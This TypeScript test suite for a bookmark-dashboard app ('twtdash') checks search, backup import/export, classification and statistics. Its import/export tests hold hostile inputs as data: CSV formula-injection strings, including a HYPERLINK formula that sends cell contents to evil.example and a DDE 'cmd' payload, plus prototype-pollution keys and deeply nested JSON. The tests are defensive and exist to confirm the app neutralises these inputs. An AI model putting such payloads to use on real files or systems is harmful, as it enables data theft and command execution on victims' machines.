    }
    // A new library snapshot is never answered from the old one's matches.
    const changed = lib.map((b, i) => (i % 2 ? { ...b, text: `${b.text} zebra`, updatedAt: b.updatedAt + 1 } : b));
    typed.search('zeb');
    typed.sync(changed);
    expect(typed.search('zebr').size).toBe(lib.length / 2);
  });

  it('handles very long queries and random input without throwing', () => {
    const big = new SearchIndex();
    big.sync(LIBRARIES[3]![1]);
    const longQuery = Array.from({ length: 300 }, (_, i) => `word${i}`).join(' ');
    expect(big.search(longQuery).size).toBe(0);
    expect(big.search('क'.repeat(50_000)).size).toBe(0);
    expect(big.search(`${'x'.repeat(5_000)} क्रिकेट`).size).toBeGreaterThan(0);
    const small = new SearchIndex();
    small.sync(randomLibrary(0xa11, 300));
    const r = rng(3);
    for (let i = 0; i < 500; i++) {
      const q = Array.from({ length: int(r, 12) }, () => pick(r, ['a', 'क्रिकेट', '#', '@', '"', '-', ' ', '😀', '‍', 'ক', 'https://', 'IPL', '\ud800'])).join('');
      const res = small.search(q);
      for (const [id, s] of res) {
        expect(typeof id).toBe('string');
        expect(Number.isFinite(s)).toBe(true);
      }
    }
  });
});

/* ------------------------------------------------------------------ */
/* Export / import                                                     */
/* ------------------------------------------------------------------ */

/** RFC 4180 reader (CRLF rows, "" escapes) used to check what a spreadsheet would see. */
function parseCsv(s: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = '';
  let quoted = false;
  for (let i = 0; i < s.length; i++) {
    const c = s[i]!;
    if (quoted) {
      if (c === '"' && s[i + 1] === '"') {
        cell += '"';
        i++;
      } else if (c === '"') quoted = false;
      else cell += c;
    } else if (c === '"' && cell === '') quoted = true;
    else if (c === ',') {
      row.push(cell);
      cell = '';
    } else if (c === '\r' && s[i + 1] === '\n') {
      row.push(cell);
      rows.push(row);
      row = [];
      cell = '';
      i++;
    } else cell += c;
  }
  row.push(cell);
  rows.push(row);
  return rows;
}

const blobs: Blob[] = [];
/** Text of the last download (Blob.text() drops a UTF-8 BOM, so it is re-added when present). */
async function lastDownload(): Promise<string> {
  const bytes = new Uint8Array(await blobs.at(-1)!.arrayBuffer());
  const text = new TextDecoder('utf-8', { ignoreBOM: true }).decode(bytes);
  return text;
}

async function snapshotDb() {
  return {
    bookmarks: await db.bookmarks.toArray(),
    collections: await db.collections.toArray(),
    categories: await db.categories.toArray(),
  };
}

const fileOf = (content: string) => new File([content], 'twtdash-backup.json', { type: 'application/json' });

function richLibrary(): { bookmarks: Bookmark[]; collections: Collection[]; categories: Category[] } {
  const lib = randomLibrary(0xfeed, 120).map((b, i) => ({
    ...b,
    savedAt: NOW - i * 3_600_000,
    createdAt: NOW - i * 7_200_000,
    sortIndex: i % 3 ? String(1796877213696000000n - BigInt(i)) : undefined,
    aiAt: i % 5 ? undefined : NOW,
    summary: i % 4 ? undefined : 'Gist: "quoted", with commas\nand lines',
    note: i % 6 ? '' : 'my note ✍️ हिंदी',
    tags: i % 2 ? ['react', 'क्रिकेट'] : [],
    collections: i % 3 ? ['c1'] : ['c1', 'c2'],
    category: i % 7 ? 'ai' : 'custom-1',
    partial: i % 11 ? undefined : true,
  }));
  const collections: Collection[] = [
    { id: 'c1', name: 'Read later', emoji: '📌', color: '#fff', createdAt: NOW, order: 0 },
    { id: 'c2', name: 'पढ़ना है, "quotes"', emoji: '📚', color: '#000', description: 'Hindi reading list', xFolderId: '123', createdAt: NOW, order: 1 },
  ];
  const categories: Category[] = [
    ...defaultCategories(),
    { id: 'custom-1', name: 'Cricket talk', emoji: '🏏', color: '#0f0', description: 'IPL', keywords: 'ipl, क्रिकेट', builtin: false, enabled: true, order: 99 },
  ];
  return { bookmarks: lib, collections, categories };
}

async function seed(data: { bookmarks: Bookmark[]; collections: Collection[]; categories: Category[] }) {
  await db.bookmarks.bulkPut(data.bookmarks);
  await db.collections.bulkPut(data.collections);
  await db.categories.bulkPut(data.categories);
}

async function wipe() {
  await Promise.all([db.bookmarks.clear(), db.collections.clear(), db.categories.clear()]);
}

describe('export / import', () => {
  beforeEach(async () => {
    blobs.length = 0;
    vi.spyOn(URL, 'createObjectURL').mockImplementation((b) => {
      blobs.push(b as Blob);
      return 'blob:test';
    });
    vi.spyOn(URL, 'revokeObjectURL').mockImplementation(() => undefined);
    vi.stubGlobal('document', {
      createElement: () => ({ click() {}, remove() {} }),
      body: { append() {} },
    });
    await wipe();
  });

  afterEach(() => {
    vi.restoreAllMocks();
    vi.unstubAllGlobals();
  });

  it('round-trips every field of every bookmark, collection and category through JSON', async () => {
    const data = richLibrary();
    await seed(data);
    const before = await snapshotDb();
    await exportJson();
    const json = await lastDownload();
    const backup = JSON.parse(json);
    expect(backup).toMatchObject({ app: 'twtdash', version: 1 });

    await wipe();
    const t0 = Date.now();
    const res = await importJson(fileOf(json));
    expect(res).toEqual({ bookmarks: before.bookmarks.length, collections: before.collections.length });
    const after = await snapshotDb();
    // importJson stamps updatedAt (so live views refresh); every other field is preserved.
    const strip = (list: Bookmark[]) => list.map(({ updatedAt: _u, ...rest }) => rest);
    expect(strip(after.bookmarks)).toEqual(strip(before.bookmarks));
    for (const b of after.bookmarks) expect(b.updatedAt).toBeGreaterThanOrEqual(t0);
    expect(after.collections).toEqual(before.collections);
    expect(after.categories).toEqual(before.categories);
  });

  it('keeps local edits to built-in categories and merges into an existing library', async () => {
    const data = richLibrary();
    await seed(data);
    await exportJson();
    const json = await lastDownload();

    await wipe();
    await ensureCategories();
    await db.categories.update('ai', { name: 'My AI', keywords: 'agents' });
    await db.bookmarks.put({ ...data.bookmarks[0]!, tags: ['local-tag'], note: 'local note' });
    await importJson(fileOf(json));
    expect((await db.categories.get('ai'))!).toMatchObject({ name: 'My AI', keywords: 'agents' });
    expect(await db.categories.get('custom-1')).toBeDefined();
    const merged = (await db.bookmarks.get(data.bookmarks[0]!.id))!;
    expect(merged.tags).toEqual(['local-tag', ...data.bookmarks[0]!.tags]);
    expect(merged.note).toBe(data.bookmarks[0]!.note || 'local note');
  });

  it('importing the same file twice does not duplicate anything', async () => {
    await seed(richLibrary());
    await exportJson();
    const json = await lastDownload();
    await wipe();
    await importJson(fileOf(json));
    const once = await snapshotDb();
    await importJson(fileOf(json));
    const twice = await snapshotDb();
    expect(twice.bookmarks).toHaveLength(once.bookmarks.length);
    expect(twice.collections).toEqual(once.collections);
    expect(twice.categories).toEqual(once.categories);
    const strip = (list: Bookmark[]) => list.map(({ updatedAt: _u, ...rest }) => rest);
    expect(strip(twice.bookmarks)).toEqual(strip(once.bookmarks));
  });

  describe('rejects malformed and hostile files cleanly', () => {
    const valid = () => {
      const b = bookmark('9001', { text: 'valid' });
      return { app: 'twtdash', version: 1, exportedAt: 'x', bookmarks: [b], collections: [], categories: [] };
    };
    const CASES: Array<[string, string]> = [
      ['not JSON', 'this is not json'],
      ['empty file', ''],
      ['truncated', JSON.stringify(valid()).slice(0, 60)],
      ['null', 'null'],
      ['a number', '42'],
      ['a string', '"twtdash"'],
      ['an array', '[]'],
      ['an empty object', '{}'],
      ['another app', JSON.stringify({ ...valid(), app: 'other' })],
      ['bookmarks is not an array', JSON.stringify({ ...valid(), bookmarks: 'lots' })],
      ['only junk entries', JSON.stringify({ ...valid(), bookmarks: [null, 1, 'x', [], {}, { id: 5 }, { id: 'a', text: 1 }] })],
      ['wrong field types', JSON.stringify({ ...valid(), bookmarks: [{ ...valid().bookmarks[0], tags: 5 }, { ...valid().bookmarks[0], id: '9002', author: { handle: 7 } }, { ...valid().bookmarks[0], id: '9003', sources: 'bookmark' }, { ...valid().bookmarks[0], id: '9004', savedAt: '2025-01-01' }, { ...valid().bookmarks[0], id: '9005', metrics: null }, { ...valid().bookmarks[0], id: '9006', createdAt: 1e20 }, { ...valid().bookmarks[0], id: '', text: 'empty id' }] })],
      ['deep nesting', `{"app":"twtdash","bookmarks":${'['.repeat(50_000)}${']'.repeat(50_000)}}`],
    ];
    for (const [name, content] of CASES) {
      it(name, async () => {
        await seed(richLibrary());
        const before = await snapshotDb();
        const err = await importJson(fileOf(content)).then(
          () => null,
          (e: unknown) => e,
        );
        expect(err).toBeInstanceOf(Error);
        // A message meant for people (shown in a toast), not a parser/engine error.
        expect((err as Error).message).toMatch(/not a twtdash backup|could be read/i);
        expect((err as Error).name).toBe('Error');
        expect(await snapshotDb()).toEqual(before);
      });
    }

    it('skips invalid rows but imports the valid ones in the same file', async () => {
      const file = valid();
      const good = file.bookmarks[0]!;
      const content = JSON.stringify({
        ...file,
        bookmarks: [good, { ...good, id: '9100', tags: 'not-an-array' }, { ...good, id: '9101', author: null }, null],
        collections: [{ id: 'c9', name: 'Fine', emoji: '', color: '', createdAt: 0, order: 3 }, null, { id: 5 }, { name: 'no id', order: 1 }],
        categories: [null, { id: 'x-cat', name: 'Custom', emoji: '', color: '', description: '', keywords: '', builtin: false, enabled: true, order: 50 }, { id: 'bad', name: 3 }],
      });
      const res = await importJson(fileOf(content));
      expect(res).toEqual({ bookmarks: 1, collections: 1 });
      expect((await db.bookmarks.toArray()).map((b) => b.id)).toEqual(['9001']);
      expect((await db.collections.toArray()).map((c) => c.id)).toEqual(['c9']);
      expect((await db.categories.toArray()).map((c) => c.id)).toEqual(['x-cat']);
    });

    it('is not fooled by prototype-pollution keys', async () => {
      const good = valid().bookmarks[0]!;
      const content = `{"__proto__":{"polluted":"top"},"app":"twtdash","version":1,"bookmarks":[${JSON.stringify(good).replace(/^\{/, '{"__proto__":{"polluted":"row","archived":1},"constructor":{"prototype":{"polluted":"ctor"}},')}],"collections":[{"__proto__":{"polluted":"col"},"id":"c7","name":"n","emoji":"","color":"","createdAt":0,"order":0}],"categories":[]}`;
      await importJson(fileOf(content));
      expect(({} as Record<string, unknown>).polluted).toBeUndefined();
      expect(Object.prototype).not.toHaveProperty('polluted');
      const stored = (await db.bookmarks.get('9001'))!;
      expect(Object.getPrototypeOf(stored)).toBe(Object.prototype);
      expect((stored as unknown as Record<string, unknown>).polluted).toBeUndefined();
      expect(stored.archived).toBe(0);
      expect(matchesScope(stored, { kind: 'all' })).toBe(true);
    });

    it('rejects 50,000 hostile entries quickly and leaves the library alone', async () => {
      await seed(richLibrary());
      const before = await snapshotDb();
      const hostile = Array.from({ length: 50_000 }, (_, i) => (i % 3 === 0 ? { id: String(i), text: 'x', author: {}, tags: 'x' } : i % 3 === 1 ? { __proto__: { a: 1 }, id: i } : 'junk'));
      const t0 = performance.now();
      await expect(importJson(fileOf(JSON.stringify({ app: 'twtdash', version: 1, bookmarks: hostile })))).rejects.toThrow(/could be read/i);
      expect(performance.now() - t0).toBeLessThan(5_000);
      expect(await snapshotDb()).toEqual(before);
    });

    it('imports a large valid backup (5,000 posts)', async () => {
      const base = bookmark('0', { text: 'bulk' });
      const many = Array.from({ length: 5_000 }, (_, i) => ({ ...base, id: `bulk${i}`, url: `https://x.com/i/status/${i}` }));
      const res = await importJson(fileOf(JSON.stringify({ app: 'twtdash', version: 1, bookmarks: many })));
      expect(res.bookmarks).toBe(5_000);
      expect(await db.bookmarks.count()).toBe(5_000);
    }, 60_000);
  });

  it('CSV escapes quotes, commas and newlines and defuses formula injection', async () => {
    const nasty = [
      '=HYPERLINK("http://evil.example/?"&A1,"Click me")',
      '+1+cmd|\' /C calc\'!A0',
      '-2+3',
      '@SUM(A1:A9)',
      '\t=1+1',
      '\r=1+1',
      'plain, with "quotes", commas\nand\r\nnewlines',
      'normal text',
      '',
      '= spaced',
      '－2+3 full-width minus is harmless',
    ];
    const list = nasty.map((text, i) =>
      bookmark(`c${i}`, {
        text,
        author: { id: '1', name: i % 2 ? '=cmd()' : 'Plain Name', handle: 'h', avatar: '', verified: false },
        note: i % 3 ? '' : '@note',
        tags: i % 4 ? [] : ['-tag', 'ok'],
        summary: i % 5 ? undefined : '+gist',
        createdAt: NOW,
        savedAt: NOW,
      }),
    );
    await db.bookmarks.bulkPut(list);
    await exportCsv();
    const csv = await lastDownload();
    expect(csv.startsWith('﻿')).toBe(true);
    const rows = parseCsv(csv.slice(1));
    const header = rows[0]!;
    expect(rows).toHaveLength(list.length + 1);
    for (const row of rows) expect(row).toHaveLength(header.length);
    const col = (name: string) => header.indexOf(name);
    const byId = new Map(rows.slice(1).map((r) => [r[col('id')]!, r]));
    const risky = /^[=+\-@\t\r]/;
    for (const b of list) {
      const row = byId.get(b.id)!;
      // No cell may start with a formula trigger…
      for (const cell of row) expect(risky.test(cell), `${b.id}: ${JSON.stringify(cell)}`).toBe(false);
      // …and the text survives intact apart from the defusing apostrophe.
      expect(row[col('text')]).toBe(risky.test(b.text) ? `'${b.text}` : b.text);
      expect(row[col('author_name')]).toBe(risky.test(b.author.name) ? `'${b.author.name}` : b.author.name);
      expect(row[col('note')]).toBe(risky.test(b.note) ? `'${b.note}` : b.note);
    }
    // Numbers stay numbers.
    expect(byId.get('c0')![col('likes')]).toBe('1');
  });
});

/* ------------------------------------------------------------------ */
/* Classifier                                                          */
/* ------------------------------------------------------------------ */

function randomUnicode(r: () => number, n: number): string {
  let s = '';
  for (let i = 0; i < n; i++) {
    const roll = int(r, 9);
    if (roll === 0) s += String.fromCharCode(0x20 + int(r, 0x5f));
    else if (roll === 1) s += String.fromCharCode(0x0900 + int(r, 0x480));
    else if (roll === 2) s += String.fromCodePoint(0x1f300 + int(r, 0x400));
    else if (roll === 3) s += pick(r, ['‍', '‌', '​', '﻿', '́', '‮', '\ud83d', '\udc00', '\u0000', '्', '़']);
    else if (roll === 4) s += String.fromCharCode(0x0600 + int(r, 0x100));
    else if (roll === 5) s += String.fromCodePoint(int(r, 0x110000) & ~0x800); // anything, avoiding most surrogates
    else if (roll === 6) s += pick(r, [' ', '\n', '#', '$', '@', 'c++', '😂', 'क्रिकेट', 'IPL', 'ai', 'https://github.com/a/b ']);
    else if (roll === 7) s += String.fromCharCode(0xff00 + int(r, 0xf0)); // full-width
    else s += String.fromCodePoint(0x1d400 + int(r, 0x400)); // math alphanumerics
  }
  return s;
}

describe('classifier', () => {
  const compiled = compileCategories(defaultCategories());
  const ids = new Set(['other', ...defaultCategories().map((c) => c.id)]);

  it('never throws on arbitrary Unicode and always returns a known category with finite scores', () => {
    const r = rng(2024);
    for (let i = 0; i < 1_500; i++) {
      const t = tweet(String(i), randomUnicode(r, int(r, i % 50 === 0 ? 20_000 : 200)), {
        card: r() < 0.3 ? { url: 'https://x', title: randomUnicode(r, 30), description: randomUnicode(r, 30), domain: randomUnicode(r, 5) } : undefined,
        quoted: r() < 0.3 ? { id: '1', url: '', text: randomUnicode(r, 50), createdAt: 0, author: AUTHORS[0]!, media: [] } : undefined,
        article: r() < 0.1 ? { title: randomUnicode(r, 20), preview: randomUnicode(r, 20) } : undefined,
        links: r() < 0.3 ? [{ url: 'https://a', display: '', domain: pick(r, ['github.com', 'm.economictimes.com', '', '.', '..', 'a..b', randomUnicode(r, 8)]) }] : [],
      });
      const res = classifyTweet(t, compiled);
      expect(ids.has(res.category), res.category).toBe(true);
      expect(Number.isFinite(res.score)).toBe(true);
      for (const v of Object.values(res.scores)) expect(Number.isFinite(v)).toBe(true);
    }
  });

  it('is deterministic, whatever was classified before (shared scratch buffers)', () => {
    const r = rng(77);
    const inputs = Array.from({ length: 300 }, (_, i) => tweet(String(i), i % 3 ? pick(r, TEXTS) + ' ' + randomUnicode(r, 40) : randomUnicode(r, 200)));
    const first = inputs.map((t) => classifyTweet(t, compiled));
    // Different order, interleaved with another compiled taxonomy.
    const custom = compileCategories([...defaultCategories(), { id: 'zz', name: 'Chai', emoji: '', color: '', description: '', keywords: 'chai, चाय, c++, $btc', builtin: false, enabled: true, order: 100 }]);
    for (const i of shuffle(r, inputs.map((_, k) => k))) {
      classifyTweet(inputs[(i * 7) % inputs.length]!, custom);
      expect(classifyTweet(inputs[i]!, compiled)).toEqual(first[i]);
    }
  });
});

/* ------------------------------------------------------------------ */
/* Shelf (resources)                                                   */
/* ------------------------------------------------------------------ */

describe('resources: property checks on random libraries', () => {
  for (const [name, lib] of LIBRARIES) {
    it(`buildShelf invariants hold (${name})`, () => {
      for (const includeArchived of [false, true]) {
        const shelf = buildShelf(lib, { includeArchived });
        const visible = lib.filter((b) => includeArchived || !b.archived);
        const byId = new Map(lib.map((b) => [b.id, b]));
        expect(shelf.total).toBe(shelf.resources.length);
        expect(shelf.byKey.size).toBe(shelf.total);
        expect(Object.values(shelf.counts).reduce((a, b) => a + b, 0)).toBe(shelf.total);
        expect(shelf.posts).toBeLessThanOrEqual(visible.length);
        const times = visible.map((b) => b.savedAt);
        const lo = Math.min(...times);
        const hi = Math.max(...times);
        let refs = 0;
        const postsWithResources = new Set<string>();
        for (const r of shelf.resources) {
          expect(r.count).toBe(r.postIds.length);
          expect(r.count).toBeGreaterThan(0);
          expect(new Set(r.postIds).size, r.key).toBe(r.postIds.length);
          for (const id of r.postIds) {
            const b = byId.get(id)!;
            expect(b).toBeDefined();
            if (!includeArchived) expect(b.archived).toBe(0);
            postsWithResources.add(id);
          }
          expect(r.sharers.reduce((a, s) => a + s.count, 0)).toBe(r.count);
          expect(r.firstSavedAt).toBeLessThanOrEqual(r.lastSavedAt);
          expect(r.firstSavedAt).toBeGreaterThanOrEqual(lo);
          expect(r.lastSavedAt).toBeLessThanOrEqual(hi);
          expect(typeof r.title).toBe('string');
          expect(typeof libraryQuery(r)).toBe('string');
          refs += r.count;
        }
        expect(postsWithResources.size).toBe(shelf.posts);
        expect(refs).toBeGreaterThanOrEqual(shelf.posts);
        for (let i = 1; i < shelf.resources.length; i++) expect(shelf.resources[i - 1]!.lastSavedAt).toBeGreaterThanOrEqual(shelf.resources[i]!.lastSavedAt);
        expect(badValues(shelf.resources.map((r) => ({ ...r, ms: undefined })))).toEqual([]);

        for (const sort of ['shared', 'recent', 'az'] as ShelfSort[]) {
          const sorted = sortResources(shelf.resources, sort);
          expect(sorted.map((r) => r.key).sort()).toEqual(shelf.resources.map((r) => r.key).sort());
        }
        const md = shelfToMarkdown(shelf.resources, { now: NOW });
        expect(md.split('\n').filter((l) => l.startsWith('- [')).length).toBe(shelf.total);
        expect(badValues(md)).toEqual([]);
      }
    });
  }

  it('filters with random queries without throwing and returns subsets', () => {
    const shelf = buildShelf(LIBRARIES[3]![1]);
    const r = rng(11);
    const PIECES = ['from:', 'site:', 'type:', 'is:', '"', '@paulg', 'github', 'repo', 'video', 'क्रिकेट', ' ', '-', ':', 'paper', 'x'.repeat(300), '\ud800'];
    const keys = new Set(shelf.resources.map((x) => x.key));
    for (let i = 0; i < 1_000; i++) {
      const q = Array.from({ length: int(r, 8) }, () => pick(r, PIECES)).join(r() < 0.5 ? ' ' : '');
      for (const res of filterResources(shelf.resources, q, pick(r, ['all', 'repo', 'paper', 'video', 'other'] as const))) expect(keys.has(res.key)).toBe(true);
    }
  });

  it('classifies and canonicalizes arbitrary strings without throwing', () => {
    const r = rng(12);
    for (let i = 0; i < 3_000; i++) {
      const raw = i % 2 ? `https://${randomUnicode(r, 10)}.${pick(r, ['com', 'in', 'co.uk', 'io', ''])}/${randomUnicode(r, 20)}?${randomUnicode(r, 10)}#${randomUnicode(r, 4)}` : randomUnicode(r, 40);
      const c = classifyUrl(raw);
      if (c) {
        expect(typeof c.key).toBe('string');
        expect(typeof c.url).toBe('string');
      }
      const canon = canonicalizeUrl(raw);
      expect(canon === null || typeof canon === 'string').toBe(true);
    }
  });
});

/* ------------------------------------------------------------------ */
/* Recall                                                              */
/* ------------------------------------------------------------------ */

describe('recall: property checks on random libraries', () => {
  function randomCards(r: () => number, lib: readonly Bookmark[]): RecallCard[] {
    return lib
      .filter(() => r() < 0.2)
      .map((b) => ({
        id: b.id,
        due: pick(r, [NOW - 3 * DAY_MS, NOW, NOW + DAY_MS, NEVER, NOW - 400 * DAY_MS, FIXED_TIME]),
        interval: int(r, 365),
        ease: 1.3 + r() * 1.7,
        reps: int(r, 10),
        lapses: int(r, 3),
        state: pick(r, ['new', 'learning', 'review', 'done'] as const),
      }));
  }

  for (const [name, lib] of LIBRARIES) {
    it(`buildQueue invariants hold (${name})`, () => {
      const r = rng(lib.length + 1);
      const byId = new Map(lib.map((b) => [b.id, b]));
      for (let k = 0; k < (lib.length > 1000 ? 12 : 25); k++) {
        const cards = randomCards(r, lib);
        const knownIds = new Set(cards.map((c) => c.id));
        const exclude = new Set(lib.filter(() => r() < 0.05).map((b) => b.id));
        const categories = r() < 0.3 ? [pick(r, CATS), pick(r, CATS)] : r() < 0.5 ? [] : undefined;
        const limit = pick(r, [0, 1, 5, 10, 30, 10_000]);
        const day = dayKey(NOW, 'Asia/Kolkata');
        const input = { bookmarks: lib, dueCards: cards.filter((c) => c.due <= NOW), knownIds, exclude, limit, categories, day, now: NOW };
        const q = buildQueue(input);
        expect(q.length).toBeLessThanOrEqual(Math.max(0, limit));
        expect(new Set(q).size, 'no duplicates').toBe(q.length);
        const dueIds = new Set(input.dueCards.filter((c) => c.state !== 'done').map((c) => c.id));
        let seenNew = false;
        for (const id of q) {
          const b = byId.get(id)!;
          expect(b).toBeDefined();
          expect(b.archived).toBe(0);
          expect(b.partial).toBeFalsy();
          expect(exclude.has(id)).toBe(false);
          if (categories?.length) expect(categories).toContain(b.category);
          if (dueIds.has(id)) expect(seenNew, 'due reviews come before new posts').toBe(false);
          else {
            seenNew = true;
            expect(knownIds.has(id), 'only posts without a Recall row are new').toBe(false);
          }
        }
        // Enough eligible posts → the queue is full.
        const eligibleNew = lib.filter((b) => !b.archived && !b.partial && (!categories?.length || categories.includes(b.category)) && !knownIds.has(b.id) && !exclude.has(b.id)).length;
        expect(q.length).toBe(Math.min(limit, eligibleNew + q.filter((id) => dueIds.has(id)).length));
        // Deterministic and independent of input order.
        expect(buildQueue({ ...input, bookmarks: shuffle(r, lib) })).toEqual(q);
      }
      for (const b of lib) expect(Number.isFinite(recallPriority(b, NOW)), b.id).toBe(true);
    });
  }

  it('schedules random rating sequences within bounds (several zones, far-future clocks)', () => {
    const r = rng(8);
    const zones = [undefined, 'UTC', 'Asia/Kolkata', 'America/New_York', 'Pacific/Chatham', 'Asia/Kathmandu', 'Australia/Lord_Howe'];
    for (let s = 0; s < 150; s++) {
      const tz = pick(r, zones);
      let now = pick(r, [NOW, Date.UTC(1971, 0, 1), Date.UTC(2199, 11, 31, 23, 59), Date.UTC(2026, 2, 8, 7, 30), Date.UTC(2026, 10, 1, 5, 59, 59)]);
      let card: RecallCard | undefined;
      for (let step = 0; step < 15; step++) {
        const rating = pick(r, ['again', 'good', 'good', 'good', 'mastered', 'notUseful'] as RecallRating[]);
        const next = schedule(card, 'p1', rating, now, tz);
        expect(next.reviews).toBe((card?.reviews ?? 0) + 1);
        expect(next.ease).toBeGreaterThanOrEqual(MIN_EASE);
        expect(next.ease).toBeLessThanOrEqual(MAX_EASE);
        expect(next.interval).toBeGreaterThanOrEqual(0);
        expect(next.interval).toBeLessThanOrEqual(MAX_INTERVAL);
        expect(next.reps).toBeGreaterThanOrEqual(0);
        expect(next.lapses).toBeGreaterThanOrEqual(card?.lapses ?? 0);
        if (next.state === 'done') expect(next.due).toBe(NEVER);
        else {
          expect(next.due).toBeGreaterThan(now);
          expect(next.due).toBeLessThanOrEqual(now + (next.interval + 1) * DAY_MS + 2 * 3_600_000);
          expect(dayKey(next.due, tz)).toBe(addDays(dayKey(now, tz), next.interval));
        }
        card = next.state === 'done' ? undefined : next;
        now = next.state === 'done' ? now + DAY_MS : next.due + int(r, 3) * DAY_MS;
      }
    }
  });

  it('day maths round-trips for random instants in many zones', () => {
    const r = rng(9);
    const zones = [undefined, 'UTC', 'Asia/Kolkata', 'America/Sao_Paulo', 'Europe/London', 'Pacific/Apia', 'Asia/Kathmandu', 'America/St_Johns'];
    for (let i = 0; i < 2_000; i++) {
      const t = Date.UTC(1970, 0, 1) + Math.floor(r() * (Date.UTC(2200, 0, 1) - Date.UTC(1970, 0, 1)));
      const tz = pick(r, zones);
      const key = dayKey(t, tz);
      const start = dayStart(key, tz);
      expect(start).toBeLessThanOrEqual(t);
      expect(nextDayStart(t, tz)).toBeGreaterThan(t);
      expect(dayKey(start, tz)).toBe(key);
    }
  });

  it('streak stats stay consistent under random review histories', () => {
    const r = rng(10);
    for (let s = 0; s < 60; s++) {
      let stats: RecallStats = EMPTY_STATS;
      let day = '2026-01-01';
      for (let i = 0; i < 60; i++) {
        day = addDays(day, int(r, 3));
        const roll = int(r, 4);
        if (roll === 0) stats = recordReviews(stats, day, 1 + int(r, 8));
        else if (roll === 1) stats = markDayComplete(stats, day);
        else if (roll === 2) stats = markRestDay(stats, day);
        const st = computeStreak(stats, day);
        expect(st.current).toBeGreaterThanOrEqual(0);
        expect(st.current).toBeLessThanOrEqual(stats.activeDays.length);
        expect(st.longest).toBeGreaterThanOrEqual(st.current);
        expect(new Set(stats.activeDays).size).toBe(stats.activeDays.length);
        expect(stats.activeDays.every((d) => !stats.restDays.includes(d))).toBe(true);
        expect(badValues(stats)).toEqual([]);
      }
    }
  });
});

/* ------------------------------------------------------------------ */
/* Wrapped                                                             */
/* ------------------------------------------------------------------ */

function wrappedProblems(s: WrappedStats, lib: readonly Bookmark[], tz: string | undefined): string[] {
  const out: string[] = [];
  const check = (ok: boolean, msg: string) => ok || out.push(msg);
  const sum = (a: number[]) => a.reduce((x, y) => x + y, 0);
  out.push(...badValues({ ...s, start: s.start, end: s.end }));
  check(s.total === countByPeriod(lib, NOW, tz)[s.period], `total ${s.total} ≠ countByPeriod`);
  check(s.total <= lib.length, 'total > library');
  check(s.hours.length === 24 && sum(s.hours) === s.total, `hours sum ${sum(s.hours)} ≠ ${s.total}`);
  check(s.weekdays.length === 7 && sum(s.weekdays) === s.total, `weekdays sum ${sum(s.weekdays)} ≠ ${s.total}`);
  check(sum(Object.values(s.mix)) === s.total, 'mix does not add up');
  for (const k of ['readShare', 'nightShare', 'morningShare', 'weekendShare'] as const) check(s[k] >= 0 && s[k] <= 1, `${k} = ${s[k]}`);
  check(s.readCount <= s.total && s.starred <= s.total, 'read/starred > total');
  const catSum = sum(s.categories.map((c) => c.count));
  check(catSum <= s.total, 'category counts > total');
  if (s.total && s.categoryCount <= 5) check(Math.abs(sum(s.categories.map((c) => c.share)) - 1) < 1e-9, 'category shares do not sum to 100%');
  for (let i = 1; i < s.categories.length; i++) check(s.categories[i - 1]!.count >= s.categories[i]!.count, 'categories not sorted');
  check(sum(s.authors.map((a) => a.count)) <= s.total, 'author counts > total');
  for (const a of s.authors) check(a.share > 0 && a.share <= 1, `author share ${a.share}`);
  if (s.total) {
    check(s.busiestHour?.count === Math.max(...s.hours), 'busiest hour is not the max');
    check(s.busiestWeekday?.count === Math.max(...s.weekdays), 'busiest weekday is not the max');
    check(s.activeDays >= 1 && !!s.streak && s.streak.days <= s.activeDays, 'streak/activeDays');
    check(!!s.streak && s.streak.end - s.streak.start + 1 === s.streak.days, 'streak length');
    check(!!s.busiestDay && s.busiestDay.count <= s.total && !!s.busiestMonth && s.busiestMonth.count >= s.busiestDay.count, 'busiest day/month');
    check(s.firstSaveInPeriod !== null && s.firstSaveInPeriod >= s.start - 1 && (s.period === 'all' || s.firstSaveInPeriod < s.end), 'first save out of range');
  } else check(s.busiestHour === null && s.streak === null && s.activeDays === 0, 'empty period has stats');
  check(s.perDay >= 0 && Number.isInteger(s.readingMinutes) && s.readingMinutes >= 0, 'perDay/readingMinutes');
  check(s.timeline.buckets.every((b) => Number.isInteger(b.count) && b.count >= 0), 'bucket counts');
  check(s.timeline.buckets.length <= 100, `${s.timeline.buckets.length} timeline buckets`);
  check(sum(s.timeline.buckets.map((b) => b.count)) <= s.total, 'timeline > total');
  check(s.persona.id in PERSONAS, `persona ${s.persona.id}`);
  check(s.funFacts.length <= 3, 'too many fun facts');
  if (s.previous) check(s.previous.total >= 0 && (s.previous.change === null || Number.isFinite(s.previous.change)), 'previous');
  const share = buildShareText(s);
  check(share.length <= 250, 'share text too long');
  out.push(...badValues(share, 'shareText'));
  return out;
}

describe('wrapped: property checks on random libraries', () => {
  const zones = [undefined, 'UTC', 'Asia/Kolkata', 'America/New_York', 'Pacific/Chatham', 'Asia/Kathmandu'];
  for (const [name, lib] of LIBRARIES) {
    it(`computeWrapped invariants hold for every period and zone (${name})`, () => {
      for (const tz of zones) {
        for (const period of WRAPPED_PERIODS) {
          const s = computeWrapped(lib, { period, now: NOW, timeZone: tz, categories: [{ id: 'custom-cricket', name: 'Cricket', emoji: '🏏', color: '#0f0' }] });
          expect(wrappedProblems(s, lib, tz), `${period} ${tz ?? 'local'}`).toEqual([]);
        }
      }
    }, 60_000);
  }

  it('handles the first and last instants Date can represent', () => {
    const lib = [bookmark('min', { savedAt: -MAX_TIME }), bookmark('max', { savedAt: MAX_TIME }), bookmark('y50', { savedAt: Date.UTC(2026, 0, 1) - 1976 * 365.2425 * DAY_MS }), bookmark('now', { savedAt: NOW })];
    for (const timeZone of [undefined, 'UTC', 'Asia/Kolkata']) {
      const s = computeWrapped(lib, { period: 'all', now: NOW, timeZone });
      expect(s.total).toBe(4);
      expect(wrappedProblems(s, lib, timeZone)).toEqual([]);
      expect(s.hours.reduce((a, b) => a + b, 0)).toBe(4);
    }
  });

  it('counts a library of identical timestamps on one day, hour and weekday', () => {
    const lib = LIBRARIES[2]![1];
    const s = computeWrapped(lib, { period: 'all', now: NOW, timeZone: 'UTC' });
    expect(s.total).toBe(lib.length);
    expect(s.activeDays).toBe(1);
    expect(s.busiestHour).toMatchObject({ hour: 3, count: lib.length });
    expect(s.streak).toMatchObject({ days: 1 });
  });
});
